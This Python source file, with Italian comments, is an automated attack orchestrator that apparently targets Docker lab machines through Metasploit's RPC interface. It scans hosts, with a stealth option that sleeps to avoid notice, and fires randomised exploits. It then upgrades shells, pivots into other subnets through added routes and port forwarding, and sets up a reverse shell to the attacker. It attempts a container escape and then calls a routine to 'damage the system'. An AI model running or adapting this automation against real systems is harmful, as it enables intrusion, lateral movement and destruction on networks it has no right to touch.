import json
import random
import ipaddress
from MetaClient import MetaClient
from util import Logger,Constants as C
from attack import Attack,MetasploitAttack,SshAttack,Attack_DB
from time import sleep


def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):

    Logger.init_logger()

    with open(config_file) as f:
        target_list=json.load(f)
    machines=[]
    other_subnet= dict()
    for ip in target_list["targets"]:
        machines.append(ip["target"])
        if "other_subnet" in ip:
            other_subnet.update({ip["target"]:ip["other_subnet"]})

    router=None
    OOBSession=None
    atk_sess=None
    compromised_machines={attacker_ip}
    uncompromised_machines=set(machines)

    
    mc=MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
    attack_db = Attack_DB(mc, attacker_ip, OOBSession)
    

    while machines:

        target_ip=machines.pop(0)
        print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
        
        attack=list(attack_db.attack_dict)
        randomized_attack=random.sample(attack,len(attack))

        if(atk_sess!=None):
            met_sess=mc.upgrade_shell(atk_sess)
            print(met_sess)


        if(target_ip in other_subnet):
            if(atk_sess==None):
                print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}") 
                print("---------------------------------------------------------")
                return 
            else:
                print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
                mc.route_add(met_sess["id_sess"], target_ip)
                #mc.route_print()
                router=met_sess
            
        
        
        if(stealth):
            scans=list(attack_db.stealth_scans_dict)
        else:
            scans=list(attack_db.scans_dict)

        s=random.choice(scans)
        
        if(s != "tcp_portscan"):
            nmap_target=str(ipaddress.IPv4Network(target_ip+"/255.255.0.0", False)).replace("/16","/24")
        else:
            nmap_target=target_ip


        scan_obj=attack_db.create_scan(s, nmap_target, attacker_ip)
        
        print(f"{C.COL_YELLOW}[*] Scanning for vulnerabilities {C.COL_RESET}")
        
        mc.attempt_scan(scan_obj)

        
        for ra in randomized_attack:

            LPORT = C.DEFAULT_LPORT  #PENTESTER LISTENING PORT
            
            attack_name=attack_db.attack_dict[ra].attack

            for p in C.TARGETS_DOCKERS[target_ip]:
                if(attack_name in p["attack_list"]):
                    LPORT=p["exposed_port"]
                    break

            print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")
            
            """
            if(attack_name=="tomcat_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="tomcat_server"):
                print(f"{C.COL_YELLOW}[*] Special attack tomcat_server cannot be done on this machine, skipping... {C.COL_RESET}")
                continue
            
            if(attack_name=="smtp_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="smtp_server"):
                print(f"{C.COL_RED}[-] Special attack smtp_server cannot be done on this machine, skipping... {C.COL_RESET}")
                continue
            """

            attack_obj= attack_db.create_attack(ra, target_ip, attacker_ip, LPORT)


            if(type(attack_obj)==SshAttack and OOBSession==None):
                print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                continue
                    

            session=mc.attempt_attack(attack_obj)
            #print(attack_obj.output)
            print(session)
            
            if(session):
                
                #poiché potrebbero avvenire dei falsi positivi relativi a qualche attacco passato si controlla che la sessione trvoata sia quella della macchina bersaglio attuale, e non di una vecchia
                if (session[0] == target_ip):
                
                    atk_sess=session[1:2][0]["id_sess"]
                    #TODO: Non essendo stato testato questo tipo di attacco tramite una sessione controllare che la funzione di attacco vada a buon fine togliendo il commento nella riga sottostante
                    #OOBSession = atk_sess
                    #print(f"OOBSession: {OOBSession}")
                    print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
                    compromised_machines.add(target_ip)
                    uncompromised_machines.remove(target_ip)
                    
                    if(attack_name=="tomcat_server"):
                        print(f"{C.COL_YELLOW} Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
                        print(f"{C.COL_YELLOW} For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
                        #prepariamo le regole di port forwarding usando la macchina intermedia su cui l'attacco docker escape si connette
                        #questa macchina intermedia effettuerà un portfwd sulla macchina attaccante permettendoci di ottenere una reverse shell
                        #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
                        #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
                        
                        mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                        #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                        escape=mc.docker_escape(atk_sess)
                        if(escape):
                            print(escape)
                            print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
                            mc.infect()
                        else:
                            print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
                            break  
                    break 
                else:
                    print(f"{C.COL_YELLOW}[*] false positive occurred, ignoring... {C.COL_RESET}")
                    
            else:
                uncompromised_machines.add(target_ip)
                print(f"{C.COL_RED}[-] xx Exploit failed {C.COL_RESET}")

            if stealth_sleep:
                print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
                sleep(stealth_sleep)
        
        print("---------------------------------------------------------")

    
    print(f"{C.COL_GREEN} Attack complete!! {C.COL_RESET}")




#Da config.json viene recuperato l'ip dell'attaccante e lo si passa al main insieme a config.json
if(__name__=='__main__'):
    main_procedure(C.ATTACKER_VM,"config.json")
